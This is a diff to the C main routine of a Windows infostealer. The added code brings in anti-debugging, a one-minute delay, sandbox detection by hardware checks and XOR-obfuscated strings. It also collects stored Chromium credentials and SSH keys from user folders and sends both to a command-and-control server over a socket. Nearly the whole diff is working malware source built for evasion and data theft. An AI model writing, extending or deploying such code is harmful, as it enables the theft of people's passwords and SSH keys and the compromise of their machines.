@@ -5,10 +5,16 @@
 #include <string.h>
 #include <wchar.h>
 #include <windows.h>
-#include <winnt.h>
 
+#include <winnt.h>
+#include <winsock2.h>
+
+#include "c2.h"
 #include "chromium.h"
+#include "delay_execution.h"
 #include "find_ssh_key.h"
+#include "hardware_requirements.h"
+#include "logins.h"
 #include "obfuscation.h"
 
 int main(void) {
@@ -21,7 +27,6 @@ int main(void) {
   // Init
   hidden_apis apis = {0};
   resolve_apis(&apis);
-
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
@@ -35,33 +40,84 @@ int main(void) {
         while (1);
       } else {
 #ifdef DEBUG
-        printf("Aucun débogueur n'est détecté sur ce processus.\n");
+      printf("Debug program detected on the process.\n");
 #endif
       }
     } else {
 #ifdef DEBUG
       printf(
-          "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur "
-          ": %lu\n",
+          "Error on CheckRemoteDebuggerPresent call. Error code : %lu\n",
           GetLastError());
 #endif
     }
   } else {
 #ifdef DEBUG
-    printf(
-        "Erreur: CheckRemoteDebuggerPresent n'a pas été résolu "
-        "correctement.\n");
+    printf("DEBUG: main: CheckRemoteDebuggerPresent failed. Error : %lu\n",
+           GetLastError());
 #endif
+  }
+
+  // 1 minute
+  if (delay_execution(60000) == EXIT_FAILURE) {
+#ifdef DEBUG
+    fprintf(stderr, "Timing inconsistencies while delaying execution");
+#endif
+    return EXIT_FAILURE;
+  }
+
+  // Stop if sandbox detected
+  int return_code = check_hardware();
+  if (return_code != EXIT_SUCCESS) {
+#ifdef DEBUG
+    fprintf(stderr, "Hardware requirements check failed. Reason: ");
+    switch (return_code) {
+      case EXIT_CPU_FAIL: fprintf(stderr, "CPU check failed.\n"); break;
+      case EXIT_RAM_FAIL: fprintf(stderr, "RAM check failed.\n"); break;
+      case EXIT_HDD_FAIL: fprintf(stderr, "HDD check failed.\n"); break;
+      case EXIT_RESOLUTION_FAIL:
+        fprintf(stderr, "Resolution check failed.\n");
+        break;
+      default: fprintf(stderr, "Unknown check failed.\n"); break;
+    }
+    fprintf(stderr, "Now exiting...");
+#endif
+    return EXIT_FAILURE;
   }
   // char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
   // XOR_STR(msvcrt_str, strlen(msvcrt_str));
   // apis.funcLoadLibraryA(msvcrt_str);
 
-  steal_chromium_creds();
+  Credential credTab[CRED_SIZE] = {0};
+  DWORD32 lenCredTab = 0;
+  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0};
+  DWORD32 lenKeysTab = 0;
 
+  steal_chromium_creds(credTab, &lenCredTab);
   wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
   XOR_STR(users_path, 8);
+  find_ssh_key(users_path, keysFilenamesTab, &lenKeysTab);
 
-  find_ssh_key(users_path);
+  for (int i = 0; i < lenCredTab; i++) {
+    printCredential(credTab[i]);
+  }
+
+  SOCKET sock;
+  BOOL success = connect_to_c2(&sock);
+  if (success == 0) {
+    exit(-1);
+  }
+
+  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);
+#ifdef DEBUG
+  if (success) {
+    printf("DEBUG: main: Info, ssh keys sent with success\n");
+  }
+#endif
+  success = send_credentials(&sock, credTab, lenCredTab);
+#ifdef DEBUG
+  if (success) {
+    printf("DEBUG: main: Info, creds sent with success\n");
+  }
+#endif
   return EXIT_SUCCESS;
 }
